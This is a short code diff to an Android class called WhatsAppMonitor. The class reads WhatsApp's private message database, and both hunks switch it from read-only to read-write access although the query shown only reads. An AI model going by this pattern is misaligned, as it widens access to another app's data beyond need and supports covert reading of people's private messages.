@@ -310,7 +310,7 @@ class WhatsAppMonitor(
             val db = SQLiteDatabase.openDatabase(
                 waDbFile.absolutePath,
                 null,
-                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
             )
 
             db.use { database ->
@@ -407,7 +407,7 @@ class WhatsAppMonitor(
         return try {
             val db = SQLiteDatabase.openDatabase(
                 dbFile.absolutePath, null,
-                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
             )
             db.use { database ->
                 val cursor = database.rawQuery("SELECT COALESCE(MAX(_id), 0) FROM message", null)
